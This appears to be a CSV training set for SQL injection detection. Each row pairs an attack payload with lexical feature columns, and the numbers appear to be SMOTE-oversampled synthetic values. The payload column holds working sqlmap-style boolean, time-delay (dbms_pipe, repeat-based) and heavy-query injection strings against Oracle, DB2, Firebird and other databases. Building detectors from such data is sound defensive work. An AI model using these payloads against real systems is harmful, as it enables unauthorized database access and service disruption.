id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000217,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000077,2.5086714433630215,141.6976467851698,32.294570100662796,3.876593368572765,55.4961084429163,11.364343919469764,52.224796281855824,22.612398140927915,0.3883729177522986,0.08367613123838238,0.36874736134221214,0.15920358966710688,3.0,0.0,0.0,0.0,0.0,0.3410859798674408,0.0,10.976742060397678,0.3410859798674409,1.658914020132559,1.6821719597348819,4.294570100662796,1.0,0.0,0.0,0.0,0.0,0.34108597986744094,1.0,0.0,0.0,3.469446951953614e-18,0.6589140201325591,0.6589140201325591,0.0,0.0,0.658914020132559,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34108597986744105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.658914020132559
SMOTE_000218,attack,boolean,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000095,1.2028109855125395,375.533219285282,31.0,3.3890684691891786,99.87325349969737,56.34003421441542,168.31993157116918,51.0,0.2658742158143738,0.150105874401048,0.44818914295349266,0.1358307668310855,0.0,0.0,2.4466780714718044,0.0,0.0,3.0,0.0,34.55332192852819,0.0,0.0,1.0,15.446678071471805,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,1.0,0.0,0.5533219285281955,0.4466780714718045,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000219,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,0.19593073974150693,28.494414356519286,10.152127494313625,2.9972844251272623,15.923936252843191,0.3422868622056576,7.190159367892029,5.038031873578408,0.5626825656579274,0.008348460053796553,0.25162331167712715,0.17734566261114892,4.0,0.0,0.0,0.0,0.0,1.0380318735784066,0.0,0.0,0.0,0.0,0.0,1.0380318735784062,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0760637471568133,0.9619681264215935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0380318735784062
SMOTE_000220,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000139,1.7959692419124451,37.10538942858771,16.046839746038987,3.1973506396062676,3.517564904764619,14.023419873019494,14.046839746038984,5.517564904764621,0.09028030937595802,0.38772599635209093,0.3744236169279615,0.1475700773439895,0.5058549682548733,0.4941450317451267,1.0,0.0,0.0,1.0,0.0,2.011709936509747,0.0,0.0,0.5058549682548732,2.0,0.5058549682548732,0.4941450317451268,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000221,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000136,1.428968249780376,125.21286991451919,28.242573982903835,3.9883418211688113,60.51979347001893,11.574260170961637,37.60396423934629,15.514852034192327,0.48169369122360783,0.09303751452838048,0.3012105463355622,0.12405824791244946,2.272278051288491,0.7277219487115095,0.0,0.0,0.24257398290383647,0.0,0.0,7.544556102576982,0.0,0.7574260170961635,3.0,0.2425739829038358,0.7574260170961635,0.2425739829038365,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.24257398290383647,0.0,0.0,0.24257398290383644,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7574260170961635,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2425739829038362
SMOTE_000222,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,0.18324886154057854,123.12551828030979,34.87448171969021,3.8507925562651084,36.50207312123916,22.497926878760843,48.062759140154895,16.062759140154895,0.2964056153379684,0.18278751776523305,0.39035411361197936,0.13045275328481923,2.0627591401548946,0.0,2.0,1.0,0.0,1.9372408598451054,0.0,8.062759140154895,0.0,0.0,1.0,4.937240859845105,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.9372408598451054,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9372408598451054
SMOTE_000223,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,1.0932674372882747,78.0,23.91804980140272,3.315249361211385,16.014078259347137,13.096028457944414,36.16390039719455,12.725992885513897,0.20530869563265555,0.16789780074287708,0.46363974868198143,0.16315375494248585,0.0,3.9999999999999996,1.0,0.0,0.0,1.725992885513897,0.0,5.451985771027794,0.0,0.27400711448610293,0.27400711448610315,2.7259928855138966,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000224,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.10604583718509597,140.5938695841314,33.04061304158686,4.188180518307917,67.9034478771548,16.203065207934294,41.487356499042306,15.0,0.4825082101333853,0.11537709279262806,0.2954019064163054,0.10671279065768116,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.121839124760578,0.0,0.04061304158685908,1.959386958413141,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000225,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000127,1.0756925802458968,145.89364828145315,31.683899508986617,4.124754213266465,69.94682414072658,18.0,38.52584926347993,19.420974877246653,0.47939150950112985,0.12365094299322092,0.2637035045804673,0.1332540429251819,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.420974877246655,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.4209748772466542,0.5790251227533457,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000226,attack,boolean,-9721'  )   or 9287  =  4362#,nearest_attack_euclidean,R000131,0.8821170009705623,30.653925394429308,16.0,3.332635243438342,2.0,12.0,11.503568540390269,5.150356854039028,0.06611392173374253,0.39668353040245546,0.3681588221784698,0.16904372568533216,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.3007137080780549,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.8496431459609727,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000227,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,1.4878639023561664,160.70377045374116,38.0,4.184180618940737,63.0,20.63698363700708,54.38527863523761,22.68150818149646,0.39236864354665457,0.12922859709779144,0.3374906255704878,0.14091213378506617,7.011131136122344,0.0,1.6592459092517697,0.0,0.0,2.0,0.0,7.011131136122344,0.0,0.0,0.0,7.659245909251769,1.0,0.0,0.3296229546258849,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.329622954625885,1.0,0.670377045374115,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000228,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.6104019318366227,151.34706474449246,34.86413300515725,4.164276086491183,80.07919915611865,14.701866291608283,41.052799437412425,15.513199859353106,0.5302232550510587,0.09592891042747104,0.2709844491560093,0.10286338536546097,0.0,0.8377332864510354,2.0,0.0,1.0,1.8377332864510354,0.0,4.837733286451035,0.0,0.0,2.0,4.837733286451035,0.0,0.8377332864510356,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.8377332864510354,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8377332864510354
SMOTE_000229,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,4.994395882273685,218.59600555623877,33.0,3.9520888747609484,59.4595075135772,56.07006844297576,78.52593711326301,24.5404924864228,0.30870388523134346,0.23235292618072328,0.3476720034831134,0.11127118510481981,0.0,0.0,2.0,0.0,1.6360328324281868,2.0,0.0,13.268426821566425,0.0,0.0,4.544131329712746,5.636032832428187,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.6360328324281865,-2.7755575615628914e-17,2.90809849728456,0.0,1.0,1.0,0.6360328324281866,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6360328324281866,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.544131329712747
SMOTE_000230,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000091,0.21377830594564357,176.8903418014416,32.088772655884675,4.127425635185817,84.46736406469196,18.0,48.68929570440365,25.733682032345982,0.4775101619443576,0.10185701136718996,0.27524667280286447,0.14538615388558798,3.8668410161729914,0.0,0.08877265588467231,0.0,1.0,2.0,0.0,5.955613672057664,0.0,5.0,4.0,6.911227344115328,1.0,0.0,0.04438632794233621,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9556136720576638,1.9556136720576638,0.0,1.0,1.955613672057664,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.911227344115328
SMOTE_000231,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000133,0.06062096857419277,143.80587124819576,32.90293562409787,4.161551592869399,75.32054936868512,16.0,37.38825750360851,15.097064375902125,0.5237144412278845,0.11126301154288282,0.2600299219648074,0.10499262526442538,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.097064375902127,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000232,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000092,0.8420663699562225,379.3714140164477,31.0,3.3445850735715097,101.35825183476695,49.00658109084039,175.18899755364407,53.81758353719633,0.26733867440667225,0.12905546223541986,0.46170847754117084,0.14189738581673697,0.0,3.2703341487853104,0.18241646280367219,0.0,0.0,3.0,0.0,36.364832925607345,0.0,0.0,1.0,13.182416462803673,0.0,0.8175835371963278,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,1.8175835371963274,0.1824164628036723,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000233,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,0.9055825977125186,207.78916563692144,35.672735395317545,3.8101056832145086,63.018206185952636,29.876376632508073,82.48730034407966,32.407282474381056,0.3030337320594526,0.1434574074913869,0.3972713862404744,0.15623747420868608,1.7345470790635094,0.0,0.0,0.0,0.0,1.7345470790635094,0.0,17.469094158127017,0.0,1.0,3.0,9.203641237190528,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.7345470790635094,0.0,0.7345470790635094,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.469094158127019
SMOTE_000234,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,1.4400079671057038,128.23036601818237,29.769633981817627,4.157248361907477,74.76439221818848,4.000000000000002,33.157071854541016,16.308901945452877,0.5829248940539604,0.031194194278541088,0.25866293524375406,0.12721797642374444,0.0,3.0,0.0,0.0,1.0,0.7696339818176263,0.0,3.769633981817627,0.7696339818176262,0.0,3.0,1.769633981817626,0.0,1.0,0.0,0.0,0.0,0.7696339818176263,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000235,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,1.6235943817074008,38.98575996746497,14.478639951197444,2.7428722012101114,2.507120016267521,10.478639951197444,20.0,6.000000000000002,0.06467978994458601,0.26797136739363037,0.5133452635859873,0.1540035790757962,1.0,0.0,0.49287998373248143,0.0,0.0,1.0,0.0,3.0,0.5071200162675185,0.0,0.0,1.4928799837324815,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.5071200162675186,0.4928799837324815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000236,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,1.234576685158445,189.61340930364514,36.41564248660856,3.908589486243673,57.65027978573697,27.325139892868485,72.97541967860545,31.662569946434242,0.30397627514929404,0.1439367337314508,0.3835017781351751,0.16858521298408005,3.168715026782879,0.0,0.0,0.0,0.0,2.0,0.0,14.493854919651364,0.0,1.5843575133914394,1.831284973217121,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0782124330428027,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.078212433042802
SMOTE_000237,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000071,2.076992515181263,158.60139135377727,38.0,4.245145659238165,63.0,22.318886916978194,51.441947895288166,21.840556541510903,0.3976129373104226,0.1416484166145246,0.32328941102923664,0.1374492350458162,6.380417406133177,0.0,2.0797217292445485,0.0,0.0,2.0,0.0,6.380417406133177,0.0,0.0,0.0,8.079721729244548,1.0,0.0,0.539860864622274,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.5398608646222741,1.0,0.4601391353777259,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000238,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,1.0438350241460241,38.000000000000014,13.269445768646687,2.6227293455378,3.0,9.0,20.0,6.000000000000002,0.0789473684210526,0.23684210526315788,0.5263157894736842,0.15789473684210525,0.7305542313533129,0.0,0.5388915372933742,0.0,0.0,1.0,0.0,3.0,0.7305542313533129,0.0,0.0,1.5388915372933738,0.730554231353313,0.0,0.2694457686466871,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000239,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.4869934661621805,141.62961824105764,33.0,4.197727797256464,70.46910922913453,16.0,40.160509011923125,15.0,0.497424189454048,0.11297902423872525,0.2836789510834218,0.10591783522380492,0.0,0.2098727470192181,2.0,0.0,1.0,2.0,0.0,4.790127252980781,0.0,0.0,2.0,5.0,0.0,0.2098727470192181,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000240,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,2.318445278325345,112.18647413591779,30.48636844069208,4.055237109458134,51.25008807935476,12.036350824821128,34.422754497255106,14.477280734486797,0.4215098108257147,0.13045977482656226,0.3131106334599717,0.13491978088775133,0.0,3.9999999999999996,0.5045438531026407,0.0,0.4954561468973593,1.0,0.0,4.990912293794719,0.0,0.5045438531026407,1.4954561468973593,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.4954561468973593,0.0,0.0,0.4954561468973593,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9909122937947186
SMOTE_000241,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,0.8570389443908067,143.94499306289714,32.27785615184245,4.141476089026934,70.94499306289714,16.0,41.0,16.0,0.49262616946741145,0.11120522313043038,0.28496338427172785,0.11120522313043038,0.27785615184244805,0.7221438481575521,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.27785615184244794,0.7221438481575522,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000242,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000142,0.36001131182968604,365.39795381703857,41.66715385308605,3.7031198128314875,114.06803078864093,35.86539998197628,158.7988307525935,56.6656922938279,0.3123661946489643,0.0980524989998788,0.4345647045158551,0.15501660183530183,0.0,3.9999999999999996,0.06656922938279086,0.0,0.0,2.066569229382791,0.0,34.0,0.0,2.066569229382791,3.733723082468836,12.798830752593492,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.06656922938279097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.534015394320463,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.600584623703256
SMOTE_000243,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,0.12482522760645322,125.19999807817743,26.260869147429876,3.52440168208172,45.7913046820561,13.0,53.14782424869146,13.260869147429876,0.36651974264750903,0.1039828848465928,0.42373986760876203,0.10575750489713617,0.0,3.9999999999999996,0.0,0.0,0.0,1.0521738294859753,0.0,8.208695317943901,0.0,0.0,0.0,1.0521738294859748,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
